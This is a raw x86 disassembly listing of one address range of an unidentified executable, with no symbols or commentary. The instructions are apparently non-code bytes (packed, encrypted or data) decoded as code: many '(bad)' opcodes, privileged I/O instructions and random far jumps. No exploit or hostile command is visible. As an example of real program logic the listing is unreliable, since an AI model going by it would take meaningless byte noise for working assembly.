  40e43b:	cmp    dh,BYTE PTR [ebp-0x45]
  40e43e:	dec    ebx
  40e43f:	ins    BYTE PTR es:[edi],dx
  40e440:	daa    
  40e441:	adc    al,BYTE PTR [esi+edi*4]
  40e444:	sbb    bl,BYTE PTR [ebx]
  40e446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e447:	jl     0x40e41e
  40e449:	jecxz  0x40e3f6
  40e44b:	(bad)  
  40e44c:	mov    ch,0xdc
  40e44e:	mov    edx,0xea8dd2a1
  40e453:	jmp    0x40e470
  40e455:	pop    ebx
  40e456:	push   edi
  40e457:	pop    ebx
  40e458:	dec    edx
  40e459:	daa    
  40e45a:	ja     0x40e468
  40e45c:	push   es
  40e45d:	sub    BYTE PTR ds:[esi],dh
  40e460:	popf   
  40e461:	jae    0x40e46a
  40e463:	jne    0x40e42a
  40e465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e466:	loopne 0x40e48c
  40e468:	mov    edi,0x65dd290c
  40e46d:	sbb    eax,0xdbc3b7af
  40e472:	ror    edx,cl
  40e474:	shr    esp,0x61
  40e477:	(bad)  
  40e478:	arpl   bx,sp
  40e47a:	lods   al,BYTE PTR ds:[esi]
  40e47b:	int3   
  40e47c:	mov    BYTE PTR cs:[ecx+ecx*8+0x33464a7b],dl
  40e484:	or     ecx,DWORD PTR [ebx]
  40e486:	add    esp,DWORD PTR [eax-0x79e6ec41]
  40e48c:	popf   
  40e48d:	jl     0x40e4ce
  40e48f:	imul   eax,DWORD PTR [eax],0x23004ec4
  40e495:	xchg   ebp,eax
  40e496:	hlt    
  40e497:	std    
  40e498:	neg    DWORD PTR [ebx+0x5115ad58]
  40e49e:	sar    DWORD PTR [edi+0x66],1
  40e4a1:	rcr    BYTE PTR [ecx+0x4d],1
  40e4a4:	(bad)  
  40e4a5:	sbb    DWORD PTR [ecx],edi
  40e4a7:	aas    
  40e4a8:	sbb    dh,ch
  40e4aa:	inc    esp
  40e4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4ac:	mov    ah,0xee
  40e4ae:	or     BYTE PTR [esi],dh
  40e4b0:	push   ss
  40e4b1:	jno    0x40e4a3
  40e4b3:	mov    edx,0x45f22b83
  40e4b8:	mov    edx,0x739ec9e
  40e4bd:	dec    ebp
  40e4be:	addr16 jns 0x40e4cd
  40e4c1:	push   0xd59fceab
  40e4c6:	lods   eax,DWORD PTR ds:[esi]
  40e4c7:	cmp    BYTE PTR [ecx],cl
  40e4c9:	mov    ds:0xa5466ec,al
  40e4ce:	xchg   DWORD PTR [edi+eax*2+0x1c],ecx
  40e4d2:	aad    0x61
  40e4d4:	scas   al,BYTE PTR es:[edi]
  40e4d5:	push   es
  40e4d6:	cmp    dl,BYTE PTR [ebp+eiz*8-0x7e6de9ed]
  40e4dd:	retf   
  40e4de:	je     0x40e499
  40e4e0:	pop    esp
  40e4e1:	jge    0x40e4a3
  40e4e3:	fwait
  40e4e4:	cmc    
  40e4e5:	fnsave [eax]
  40e4e7:	mov    esi,0xf3eabbaf
  40e4ec:	or     ebp,0x46ee59f5
  40e4f2:	xchg   bl,bl
  40e4f4:	xchg   bl,ah
  40e4f6:	or     BYTE PTR ds:0x1d54d300,0x44
  40e4fd:	mov    ebp,0xbb18333c
  40e502:	mov    ah,0xeb
  40e504:	outs   dx,DWORD PTR ds:[esi]
  40e505:	or     eax,0x3abb9899
  40e50a:	(bad)  
  40e50b:	ror    al,1
  40e50d:	shl    dh,0x2e
  40e510:	mov    BYTE PTR [eax+0x553c79d0],0x89
  40e517:	iret   
  40e518:	stos   DWORD PTR es:[edi],eax
  40e519:	mov    ds:0xdba0b76f,al
  40e51e:	inc    edx
  40e51f:	push   ss
  40e520:	sub    edx,0x10
  40e523:	test   al,0x3d
  40e525:	mov    dh,0x68
  40e527:	mov    edx,0xd358f96c
  40e52c:	sub    ah,ah
  40e52e:	push   ss
  40e52f:	cmp    eax,0x16deb269
  40e534:	(bad)  
  40e535:	call   0x68e14c55
  40e53a:	int3   
  40e53b:	push   esp
  40e53c:	adc    al,0xb8
  40e53e:	xchg   ebx,eax
  40e53f:	push   ecx
  40e540:	stos   BYTE PTR es:[edi],al
  40e541:	xor    ebx,DWORD PTR [ebp-0x80]
  40e544:	sub    eax,0x21e91e6
  40e549:	jb     0x40e4ed
  40e54b:	daa    
  40e54c:	push   ss
  40e54d:	jg     0x40e5ae
  40e54f:	repnz xlat BYTE PTR ds:[ebx]
  40e551:	repnz out 0xcf,al
  40e554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e555:	add    eax,0xa391ebc5
  40e55a:	pop    eax
  40e55b:	fadd   st(6),st
  40e55d:	js     0x40e5d2
  40e55f:	rol    BYTE PTR [esi-0x50d46847],0xc0
  40e566:	lea    esi,[eax+ebp*8]
  40e569:	adc    edx,eax
  40e56b:	es test eax,0x1b4e1e7f
  40e571:	push   esp
  40e572:	(bad)  
  40e573:	mov    eax,ds:0x632d411b
  40e578:	push   edi
  40e579:	xor    edx,DWORD PTR [ebp+0x1e]
  40e57c:	add    bh,BYTE PTR [ecx-0x29]
  40e57f:	push   ebp
  40e580:	das    
  40e581:	mov    esi,0xd3ef2954
  40e586:	jg     0x40e5c6
  40e588:	scas   eax,DWORD PTR es:[edi]
  40e589:	test   al,0x50
  40e58b:	pop    es
  40e58c:	adc    eax,0x6e0a240e
  40e591:	adc    ebp,0xcd070ae1
  40e597:	test   eax,0x9902d1f8
  40e59c:	int3   
  40e59d:	mov    ds:0x7a3de25a,al
  40e5a2:	cli    
  40e5a3:	push   0xd51a5ec9
  40e5a8:	imul   esp,esp,0xf0916d75
  40e5ae:	repnz test al,0x68
  40e5b1:	imul   DWORD PTR [edi+0x49dafa13]
  40e5b7:	addr16 cmp eax,0x20ef1290
  40e5bd:	sahf   
  40e5be:	sub    BYTE PTR gs:[eax+0x34ead2f0],cl
  40e5c5:	mov    edx,0x1d3adde7
  40e5ca:	push   ebp
  40e5cb:	inc    ecx
  40e5cc:	pop    edx
  40e5cd:	ret    
  40e5ce:	sti    
  40e5cf:	das    
  40e5d0:	push   esi
  40e5d1:	enter  0x1d1e,0xf7
  40e5d5:	ins    BYTE PTR es:[edi],dx
  40e5d6:	xor    BYTE PTR [ecx],bh
  40e5d8:	adc    ah,cl
  40e5da:	out    0xc7,eax
  40e5dc:	mov    BYTE PTR [esi],0x83
  40e5df:	xor    DWORD PTR [edx+0x679c3502],esi
  40e5e5:	dec    ecx
  40e5e6:	cmc    
  40e5e7:	and    ecx,DWORD PTR [edx+0x2c]
  40e5ea:	out    0xf8,eax
  40e5ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5ed:	xchg   esp,eax
  40e5ee:	xor    eax,0x310eea61
  40e5f3:	and    eax,0xde1b0ff3
  40e5f8:	cwde   
  40e5f9:	in     al,dx
  40e5fa:	fidivr DWORD PTR [ebx+0xf219ff7]
  40e600:	mov    ?,WORD PTR [ebp+0x6c641e0f]
  40e606:	loopne 0x40e5b1
  40e608:	add    BYTE PTR [ebp+0x2ffbcb1d],ah
  40e60e:	(bad)  
  40e60f:	and    DWORD PTR [eax+0x66fa88da],ebp
  40e615:	aad    0xe0
  40e617:	sbb    al,0x80
  40e619:	inc    eax
  40e61a:	inc    esp
  40e61b:	pop    ss
  40e61c:	xchg   DWORD PTR [edx-0x18],edx
  40e61f:	or     cl,ah
  40e621:	push   ds
  40e622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e623:	rcl    BYTE PTR [edx],cl
  40e625:	loopne 0x40e636
  40e627:	lds    edx,FWORD PTR [eax-0x2d]
  40e62a:	addr16 sbb eax,0x9455684d
  40e630:	es ins BYTE PTR es:[edi],dx
  40e632:	imul   esi,DWORD PTR [esi],0xfffffff3
  40e635:	mov    esp,0x8c805d64
  40e63a:	pop    ebx
  40e63b:	fwait
  40e63c:	cmp    BYTE PTR [esi-0x2b],0x4c
  40e640:	fcomp  QWORD PTR [eax-0x5b66a84f]
  40e646:	mov    ebx,0x967f68ac
  40e64b:	and    eax,ecx
  40e64d:	fadd   DWORD PTR [ebp-0x11]
  40e650:	jmp    0x40e5e6
  40e652:	pop    eax
  40e653:	xor    BYTE PTR [ecx],cl
  40e655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e656:	(bad)  
  40e657:	aad    0x1f
  40e659:	or     DWORD PTR [ecx*8+0xfb3063b],esi
  40e660:	jl     0x40e639
  40e662:	addr16 test al,ch
  40e665:	xchg   BYTE PTR [edi-0x5e],dl
  40e668:	add    al,BYTE PTR [edx]
  40e66a:	push   ebp
  40e66b:	mov    dh,0xd2
  40e66d:	(bad)  
  40e66e:	loope  0x40e6c9
  40e670:	nop
  40e671:	dec    edx
  40e672:	dec    ebp
  40e673:	dec    edx
  40e674:	cmp    ah,BYTE PTR [esi+0x32]
  40e677:	scas   al,BYTE PTR es:[edi]
  40e678:	pop    edx
  40e679:	cwde   
  40e67a:	sbb    al,0xf7
  40e67c:	shr    DWORD PTR [ebx],cl
  40e67e:	fstp   TBYTE PTR [eax+0x7015e9c6]
  40e684:	loope  0x40e624
  40e686:	lea    edx,ds:0x35f354f5
  40e68c:	imul   ecx,eax,0x22
  40e68f:	xchg   ecx,eax
  40e690:	add    edx,DWORD PTR [edx-0x78]
  40e693:	cmp    ebp,DWORD PTR [esi-0x1dab81e1]
  40e699:	leave  
  40e69a:	cmp    al,0xcf
  40e69c:	pop    ss
  40e69d:	ss push es
  40e69f:	rol    BYTE PTR [eax-0x1e7e0519],0x1a
  40e6a6:	test   DWORD PTR [eax-0x39d239d7],0x195984e7
  40e6b0:	hlt    
  40e6b1:	mov    edi,0xcd6e333
  40e6b6:	test   bl,bl
  40e6b8:	into   
  40e6b9:	mov    edx,0x736d220f
  40e6be:	and    DWORD PTR [ebx-0xc],ecx
  40e6c1:	jge    0x40e6ea
  40e6c3:	outs   dx,BYTE PTR ds:[esi]
  40e6c4:	mov    ch,0x5d
  40e6c6:	loope  0x40e677
  40e6c8:	sub    eax,0xaf1a6e11
  40e6cd:	ret    
  40e6ce:	mov    eax,ds:0xf7f7c003
  40e6d3:	add    al,0x81
  40e6d5:	aaa    
  40e6d6:	mov    ah,0xde
  40e6d8:	push   cs
  40e6d9:	mov    esi,0x566b4ff4
  40e6de:	sbb    bh,BYTE PTR [edx+0x41]
  40e6e1:	rcl    DWORD PTR [eax],cl
  40e6e3:	mov    ebp,0x1d3816ad
  40e6e8:	and    eax,0xdaeec4f2
  40e6ed:	jge    0x40e748
  40e6ef:	push   edi
  40e6f0:	sub    eax,0x2d0f21fb
  40e6f5:	cmp    dl,cl
  40e6f7:	and    BYTE PTR [edi],0x78
  40e6fa:	je     0x40e6ab
  40e6fc:	pop    edi
  40e6fd:	xor    esi,DWORD PTR ds:[edx]
  40e700:	jb     0x40e771
  40e702:	ret    
  40e703:	ret    
  40e704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e705:	cdq    
  40e706:	sbb    al,0xae
  40e708:	push   0xffffffee
  40e70a:	xor    eax,0xd92355
  40e70f:	add    ah,BYTE PTR [ebx+0x20766aa5]
  40e715:	mov    cl,ah
  40e717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e718:	mov    al,0xbb
  40e71a:	mov    edi,0xc13f0a10
  40e71f:	int3   
  40e720:	je     0x40e704
  40e722:	jmp    0x5e95:0x107c2a7
  40e729:	jmp    0x2fef26a
  40e72e:	(bad)  
  40e72f:	xchg   edx,eax
  40e730:	popf   
  40e731:	(bad)  
  40e733:	les    esp,FWORD PTR [ecx-0x22]
  40e736:	aad    0x36
  40e738:	cwde   
  40e739:	mov    WORD PTR [ebp-0x77],fs
  40e73c:	fild   DWORD PTR [edi-0x55058afe]
  40e742:	outs   dx,DWORD PTR ds:[esi]
  40e743:	fdivr  QWORD PTR [ebx-0x583e490e]
  40e749:	dec    ebp
  40e74a:	vunpcklps ymm3,ymm1,YMMWORD PTR [edx+0xc]
  40e74f:	outs   dx,BYTE PTR ds:[esi]
  40e750:	bound  esp,QWORD PTR [ebx+0x38]
  40e753:	ret    0xcde5
  40e756:	pop    esp
  40e757:	fsubr  DWORD PTR ds:0xa376d74c
  40e75d:	das    
  40e75e:	aaa    
  40e75f:	lods   eax,DWORD PTR ds:[esi]
  40e760:	sub    eax,0x3a33304a
  40e765:	sti    
  40e766:	leave  
  40e767:	jne    0x40e76f
  40e769:	mov    edx,0x47b1d165
  40e76e:	sbb    al,0x26
  40e770:	xchg   ebx,eax
  40e771:	icebp  
  40e772:	or     DWORD PTR [edx+edx*8-0x33],ecx
  40e776:	cmp    eax,0xd27dd528
  40e77b:	jb     0x40e794
  40e77d:	mov    esi,0x2ccc8225
  40e782:	outs   dx,DWORD PTR ds:[esi]
  40e783:	pop    ebp
  40e784:	and    eax,0xae53d7d2
  40e789:	add    esp,DWORD PTR [esi+0x58fe8867]
  40e78f:	in     eax,dx
  40e790:	fsubr  DWORD PTR [edx-0x36]
  40e793:	mov    bh,0x12
  40e795:	jns    0x40e75b
  40e797:	inc    edx
  40e798:	fnstsw WORD PTR [eax+0x61]
  40e79b:	cmp    bh,ch
  40e79d:	cmp    DWORD PTR [esi+0x4de627f7],esp
  40e7a3:	das    
  40e7a4:	or     DWORD PTR [ecx],ebx
  40e7a6:	sti    
  40e7a7:	xchg   DWORD PTR gs:[ecx+0x704f25a1],esp
  40e7ae:	pop    edi
  40e7af:	(bad)  
  40e7b0:	mov    cl,0x42
  40e7b2:	jp     0x40e77c
  40e7b4:	test   eax,0x6f9ae2db
  40e7b9:	dec    ebx
  40e7ba:	lods   eax,DWORD PTR ds:[esi]
  40e7bb:	pusha  
  40e7bc:	mov    esp,0x748bd9da
  40e7c1:	sub    al,0xe8
  40e7c3:	in     al,dx
  40e7c4:	lods   eax,DWORD PTR ds:[esi]
  40e7c5:	cmc    
  40e7c6:	dec    esp
  40e7c7:	xchg   edx,eax
  40e7c8:	test   al,0xe2
  40e7ca:	fidiv  DWORD PTR [edx]
  40e7cc:	cld    
  40e7cd:	pop    es
  40e7ce:	fisub  WORD PTR [edi]
  40e7d0:	aas    
  40e7d1:	ins    BYTE PTR es:[edi],dx
  40e7d2:	and    eax,0xa727b274
  40e7d7:	inc    esi
  40e7d8:	adc    al,0xee
  40e7da:	pop    ebp
  40e7db:	mov    al,ds:0x905ca873
  40e7e0:	bound  edi,QWORD PTR [edx-0x1]
  40e7e3:	add    eax,0xebeb9b94
  40e7e8:	cmp    al,BYTE PTR [edx]
  40e7ea:	jge    0x40e7f8
  40e7ec:	jecxz  0x40e828
  40e7ee:	enter  0xdeb7,0xd6
  40e7f2:	out    0x83,al
  40e7f4:	stos   BYTE PTR es:[edi],al
  40e7f5:	(bad)  
  40e7f6:	xlat   BYTE PTR ds:[ebx]
  40e7f7:	rcr    BYTE PTR [ebx+esi*4-0x7daf5d2b],1
  40e7fe:	inc    edi
  40e7ff:	sti    
  40e800:	cmp    DWORD PTR [edx-0x59ef7366],edi
  40e806:	fdivr  QWORD PTR [esi+0x41a17db7]
  40e80c:	pop    bp
  40e80e:	mov    esi,0xf4cff41b
  40e813:	cdq    
  40e814:	shl    ah,0xf2
  40e817:	adc    BYTE PTR [ebp-0x7d67eafe],ch
  40e81d:	mov    ds:0xa990f31,al
  40e822:	rol    DWORD PTR [ecx+0xb5f01e5],1
  40e828:	rcr    BYTE PTR [edx-0x4e],1
  40e82b:	jmp    0x40e7bb
  40e82d:	sbb    BYTE PTR [eax-0x210552c6],bh
  40e833:	(bad)  
  40e834:	rol    BYTE PTR ds:0x3a23258,1
  40e83a:	mov    esi,0x9da1a5d
  40e83f:	stos   DWORD PTR es:[edi],eax
  40e840:	xchg   esp,eax
  40e841:	ret    
  40e842:	inc    ecx
  40e843:	sbb    al,0x78
  40e845:	(bad)  
  40e846:	lds    ebp,FWORD PTR [ebx+0x705bfdb2]
  40e84c:	sbb    al,0xb3
  40e84e:	(bad)  [ebx-0xe861d9f]
  40e854:	or     ah,BYTE PTR [esi+0x12]
  40e857:	sbb    al,0x89
  40e859:	xlat   BYTE PTR ds:[ebx]
  40e85a:	pop    ds
  40e85b:	sub    ebp,DWORD PTR [eax-0x2c]
  40e85e:	sub    ebp,0xffffffca
  40e861:	lds    ebx,FWORD PTR [esi]
  40e863:	daa    
  40e864:	jne    0x40e80e
  40e866:	aad    0x64
  40e868:	xchg   esi,eax
  40e869:	imul   esp,DWORD PTR [eax],0x79
  40e86c:	ins    DWORD PTR es:[edi],dx
  40e86d:	dec    edx
  40e86e:	out    0x26,al
  40e870:	xor    eax,0x239135a1
  40e875:	jno    0x40e81a
  40e877:	pop    es
  40e878:	sub    cl,BYTE PTR [ecx-0x7604ae0c]
  40e87e:	hlt    
  40e87f:	gs pop ebp
  40e881:	add    eax,0x1fcfae73
  40e886:	adc    eax,0x35e17fa4
  40e88b:	aad    0xdb
  40e88d:	push   es
  40e88e:	pop    ss
  40e88f:	jmp    0xa7d9:0x172b37fd
  40e896:	mov    bh,0xac
  40e898:	jge    0x40e8af
  40e89a:	hlt    
  40e89b:	and    esi,DWORD PTR [ecx]
  40e89d:	test   DWORD PTR [edi],ecx
  40e89f:	repnz or ch,BYTE PTR [ecx]
  40e8a2:	or     eax,0xed91f84a
  40e8a7:	scas   al,BYTE PTR es:[edi]
  40e8a8:	sub    ah,BYTE PTR [edi-0x18]
  40e8ab:	cli    
  40e8ac:	out    0xdb,al
  40e8ae:	inc    edi
  40e8af:	shr    DWORD PTR [edx+ecx*8],cl
  40e8b2:	test   eax,esi
  40e8b4:	add    eax,0xe6989f2
  40e8b9:	fwait
  40e8ba:	mov    bl,0xfe
  40e8bc:	in     eax,dx
  40e8bd:	dec    ebp
  40e8be:	cld    
  40e8bf:	loope  0x40e8fc
  40e8c1:	mov    ah,0xbd
  40e8c3:	int    0xb1
  40e8c5:	dec    ecx
  40e8c6:	frstor ds:0x24160647
  40e8cc:	xchg   ebp,eax
  40e8cd:	aad    0x84
  40e8cf:	jge    0x40e8d1
  40e8d1:	sbb    eax,0xe21fa33
  40e8d6:	nop
  40e8d7:	aam    0x75
  40e8d9:	(bad)  
  40e8da:	in     eax,0xda
  40e8dc:	clc    
  40e8dd:	repz mov bl,0x16
  40e8e0:	or     eax,0x295511c6
  40e8e5:	dec    esi
  40e8e6:	sbb    DWORD PTR [edi+0xfc80b49],0xffffffc2
  40e8ed:	pop    esp
  40e8ee:	out    0xa0,eax
  40e8f0:	fsubp  st(5),st
  40e8f2:	dec    BYTE PTR [ebp-0x30e9aafd]
  40e8f8:	inc    DWORD PTR [edi+0x54]
  40e8fb:	fnstsw WORD PTR [ebx-0x461690ee]
  40e901:	jl     0x40e96f
  40e903:	mov    al,ds:0xa3f19ac4
  40e908:	cwde   
  40e909:	lds    ebp,FWORD PTR [edx+0x40]
  40e90c:	push   ebx
  40e90d:	fiadd  DWORD PTR [ecx]
  40e90f:	test   eax,0xd543327a
  40e914:	dec    ecx
  40e915:	xchg   ebp,eax
  40e916:	and    eax,0xbe4a6922
  40e91b:	jmp    0xf1a6:0xc70adb93
  40e922:	shl    dh,0x53
  40e925:	dec    edx
  40e926:	add    eax,0xb90dd4f9
  40e92b:	xor    ebx,DWORD PTR [eax]
  40e92d:	hlt    
  40e92e:	int    0x7e
  40e930:	aam    0x4d
  40e932:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e934:	xor    dl,BYTE PTR es:[edx-0x33]
  40e938:	mov    WORD PTR [edi],gs
  40e93a:	loope  0x40e984
  40e93c:	dec    eax
  40e93d:	jl     0x40e98b
  40e93f:	ins    BYTE PTR es:[edi],dx
  40e940:	ja     0x40e8fb
  40e942:	ins    BYTE PTR es:[edi],dx
  40e943:	(bad)  
  40e944:	test   eax,0x5828c0b6
  40e949:	(bad)  
  40e94a:	adc    esi,DWORD PTR [esi-0x49]
  40e94d:	jg     0x40e967
  40e94f:	ret    
  40e950:	popf   
  40e951:	(bad)  
  40e952:	jmp    0x40e957
  40e954:	leave  
  40e955:	mov    ds:0xd0528fd8,al
  40e95a:	mov    edi,0xae408811
  40e95f:	imul   BYTE PTR [esi+ebp*1-0x1bb6f760]
  40e966:	nop
  40e967:	dec    ecx
  40e968:	leave  
  40e969:	mov    ds:0x83ad1c66,eax
  40e96e:	popa   
  40e96f:	pusha  
  40e970:	push   esi
  40e971:	push   ds
  40e972:	lea    edx,[eax+edx*1]
  40e975:	mov    al,0xc8
  40e977:	mov    fs,WORD PTR [eax+eax*8-0x2f]
  40e97b:	xor    eax,0x60fff0c9
  40e980:	inc    edi
  40e981:	jmp    0xfdc5:0x1033a162
  40e988:	lahf   
  40e989:	jg     0x40e931
  40e98b:	in     eax,dx
  40e98c:	jo     0x40e963
  40e98e:	lahf   
  40e98f:	mov    dh,BYTE PTR [edi-0x36]
  40e992:	cs mov edx,0x1c52d926
  40e998:	mov    ds:0x29371420,al
  40e99d:	dec    ebx
  40e99e:	and    eax,0xbe6916d1
  40e9a3:	rcl    edx,0xf1
  40e9a6:	mov    ecx,0xbbd4b3b
  40e9ab:	mov    cs,WORD PTR [esi-0x20ce235b]
  40e9b1:	mov    ch,0x1a
  40e9b3:	sbb    al,0xdc
  40e9b5:	inc    edi
  40e9b6:	sti    
  40e9b7:	fsub   DWORD PTR [esi+0x8]
  40e9ba:	xor    BYTE PTR [esi-0x52],ah
  40e9bd:	mov    ebx,0x6915175b
  40e9c2:	jg     0x40e9c8
  40e9c4:	jnp    0x40e947
  40e9c6:	fwait
  40e9c7:	mov    eax,0xc1eb35c7
  40e9cc:	in     al,dx
  40e9cd:	cmp    BYTE PTR [edx],dl
  40e9cf:	jns    0x40ea4b
  40e9d1:	test   esi,0x7f46689a
  40e9d7:	jb     0x40e9ba
  40e9d9:	push   edx
  40e9da:	dec    ebx
  40e9db:	push   eax
  40e9dc:	(bad)  
  40e9dd:	iret   
  40e9de:	xchg   ebx,eax
  40e9df:	inc    esp
  40e9e0:	leave  
  40e9e1:	(bad)  
  40e9e3:	sbb    DWORD PTR [ecx+0x2cfcac52],edi
  40e9e9:	pushf  
  40e9ea:	lods   al,BYTE PTR ds:[esi]
  40e9eb:	enter  0xbd2d,0x9d
  40e9ef:	dec    esi
  40e9f0:	(bad)  
  40e9f1:	jns    0x40e9ca
  40e9f3:	jb     0x40e9d7
  40e9f5:	mov    eax,ds:0xb8cfb4e6
  40e9fa:	hlt    
  40e9fb:	adc    dh,0x33
  40e9fe:	mov    bl,0x20
  40ea00:	inc    edx
  40ea01:	sub    eax,0xaebd0dbe
  40ea06:	add    esp,DWORD PTR [esi+0x40]
  40ea09:	pop    edi
  40ea0a:	pop    edx
  40ea0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea0c:	mov    ebx,0xe7635f02
  40ea11:	shr    DWORD PTR [ebx],0xa5
  40ea14:	bound  esi,QWORD PTR [ebp+0x5ec79cc3]
  40ea1a:	fs xchg ecx,eax
  40ea1c:	cwde   
  40ea1d:	mov    DWORD PTR [edi+0x66445116],0x7bbaedc0
  40ea27:	fldcw  WORD PTR gs:0xb14e5df
  40ea2e:	xchg   ebx,eax
  40ea2f:	fdivr  st,st(1)
  40ea31:	xor    DWORD PTR [eax+esi*8+0x2d],esp
  40ea35:	test   DWORD PTR ds:0x562c6ccf,esp
  40ea3b:	pop    esi
  40ea3c:	(bad)  
  40ea3d:	mul    BYTE PTR [eax]
  40ea3f:	(bad)  [ecx]
  40ea41:	jo     0x40ea74
  40ea43:	fld    QWORD PTR [eax+edx*1+0x5cd1cdd9]
  40ea4a:	sub    dl,BYTE PTR gs:[eax]
  40ea4d:	out    dx,eax
  40ea4e:	cdq    
  40ea4f:	ja     0x40ea4d
  40ea51:	and    BYTE PTR [esp+esi*2-0xacaa02b],bl
  40ea58:	cmp    DWORD PTR [eax],edi
  40ea5a:	dec    ebx
  40ea5b:	jmp    0x40ead0
  40ea5d:	xor    edx,edx
  40ea5f:	push   cs
  40ea60:	hlt    
  40ea61:	jb     0x40ea7d
  40ea63:	sbb    DWORD PTR [ebp+0xa],ebx
  40ea66:	cmp    eax,0x865ccaed
  40ea6b:	adc    ecx,esi
  40ea6d:	dec    eax
  40ea6e:	aas    
  40ea6f:	int3   
  40ea70:	add    al,0x1
  40ea72:	or     cl,BYTE PTR [edx]
  40ea74:	or     dl,dh
  40ea76:	cli    
  40ea77:	ss fs sahf 
  40ea7a:	xor    al,0x23
  40ea7c:	and    al,0x9f
  40ea7e:	or     ecx,DWORD PTR [ecx]
  40ea80:	mov    cs,esp
  40ea82:	xor    al,0x88
  40ea84:	sbb    al,0xa5
  40ea86:	dec    ebp
  40ea87:	cli    
  40ea88:	ss sahf 
  40ea8a:	mov    BYTE PTR [edx+0x247c893c],bl
  40ea90:	and    al,0x96
  40ea92:	push   esp
  40ea93:	sahf   
  40ea94:	and    ecx,edi
  40ea96:	mov    ss,WORD PTR [edx-0x672dfc0e]
  40ea9c:	out    0xfd,al
  40ea9e:	jnp    0x40ead0
  40eaa0:	xor    al,0xd
  40eaa2:	lods   eax,DWORD PTR ds:[esi]
  40eaa3:	jns    0x40eb10
  40eaa5:	(bad)  
  40eaa7:	cmp    al,0xe9
  40eaa9:	shr    BYTE PTR [edi],cl
  40eaab:	sub    eax,0x9aa7be9a
  40eab0:	shl    DWORD PTR [eax-0x13],0x2e
  40eab4:	dec    edi
  40eab5:	std    
  40eab6:	sub    BYTE PTR [edi-0x6c],dl
  40eab9:	scas   al,BYTE PTR es:[edi]
  40eaba:	addr16 pop es
  40eabc:	sbb    esi,ecx
  40eabe:	or     dl,bl
  40eac0:	stos   DWORD PTR es:[edi],eax
  40eac1:	xor    eax,0xebb240ed
  40eac6:	jbe    0x40eb0b
  40eac8:	mov    edx,DWORD PTR [eax]
  40eaca:	and    al,BYTE PTR [ebx]
  40eacc:	test   al,0x2f
  40eace:	les    edi,FWORD PTR ds:0x7f0e5f8c
  40ead4:	outs   dx,BYTE PTR ds:[esi]
  40ead5:	ror    DWORD PTR [esi+0x61],0xd2
  40ead9:	pop    eax
  40eada:	loope  0x40eb4c
  40eadc:	adc    eax,0x145fd4c5
  40eae1:	push   eax
  40eae2:	sub    cl,bl
  40eae4:	add    al,0x8a
  40eae6:	call   0xe2d4:0x68395d62
  40eaed:	mov    ds:0x4f433c4f,eax
  40eaf2:	sbb    DWORD PTR [edi+ebx*4+0x7e],0x39
  40eaf7:	add    cl,bl
  40eaf9:	mov    ah,0xf
  40eafb:	data16 fcomp QWORD PTR [edi]
  40eafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaff:	aas    
  40eb00:	aam    0x61
  40eb02:	jne    0x40eaa3
  40eb04:	pop    es
  40eb05:	jmp    0x40ea99
  40eb07:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40eb09:	cmp    BYTE PTR [eax],0xa7
  40eb0c:	push   es
  40eb0d:	dec    edx
  40eb0e:	xchg   edx,eax
  40eb0f:	aas    
  40eb10:	push   ds
  40eb11:	push   0xffffffa6
  40eb13:	add    al,bh
  40eb15:	sbb    esi,ebx
  40eb17:	stc    
  40eb18:	pop    ecx
  40eb19:	mov    eax,ds:0x6a22cad6
  40eb1e:	ja     0x40eae3
  40eb20:	mov    cl,0x9f
  40eb22:	test   ah,cl
  40eb24:	dec    edx
  40eb25:	iret   
  40eb26:	fsubr  QWORD PTR [ebx-0x5c]
  40eb29:	neg    BYTE PTR [edi+eiz*4-0x2c]
  40eb2d:	mov    al,ds:0x27e1505a
  40eb32:	jb     0x40eb79
  40eb34:	test   DWORD PTR [edx-0x7f],ebx
  40eb37:	fidiv  DWORD PTR [eax-0x31]
  40eb3a:	pusha  
  40eb3b:	xor    edi,DWORD PTR [ecx]
  40eb3d:	loope  0x40eb22
  40eb3f:	sub    al,0x28
  40eb41:	xor    ch,BYTE PTR [eax]
  40eb43:	sbb    bh,ah
  40eb45:	mov    bl,0xf
  40eb47:	addr16 retf 
  40eb49:	popf   
  40eb4a:	xor    al,0x1a
  40eb4c:	jle    0x40eb50
  40eb4e:	jp     0x40eb48
  40eb50:	imul   eax,ebp,0xb91f9197
  40eb56:	loope  0x40eb4f
  40eb58:	xchg   ecx,eax
  40eb59:	sub    eax,0x517f60a0
  40eb5e:	sub    eax,eax
  40eb60:	je     0x40eb9f
  40eb62:	int3   
  40eb63:	loopne 0x40eaf6
  40eb65:	(bad)
  40eb68:	leave  
  40eb69:	xor    dl,bl
  40eb6b:	(bad)  
  40eb6c:	out    0xcc,al
  40eb6e:	or     eax,0xb906409d
  40eb73:	fild   DWORD PTR [edx]
  40eb75:	dec    esp
  40eb76:	dec    ebp
  40eb77:	fisttp WORD PTR [esi+0xb]
  40eb7a:	push   edi
  40eb7b:	inc    ecx
  40eb7c:	fcmovnu st,st(1)
  40eb7e:	adc    al,0x1
  40eb80:	adc    esp,DWORD PTR [esi-0x67]
  40eb83:	lahf   
  40eb84:	dec    ecx
  40eb85:	xlat   BYTE PTR ds:[ebx]
  40eb86:	and    BYTE PTR [eax-0x3d],al
  40eb89:	and    DWORD PTR [esi+ecx*8],edi
  40eb8c:	out    dx,eax
  40eb8d:	ss sub esp,esi
  40eb90:	idiv   cl
  40eb92:	and    al,0xd1
  40eb94:	and    al,0x66
  40eb96:	lods   eax,DWORD PTR ds:[esi]
  40eb97:	mov    bl,0x8f
  40eb99:	pop    esi
  40eb9b:	outs   dx,BYTE PTR ds:[esi]
  40eb9c:	pop    ss
  40eb9d:	jge    0x40eb9b
  40eb9f:	(bad)  
  40eba0:	rcr    bh,0xf1
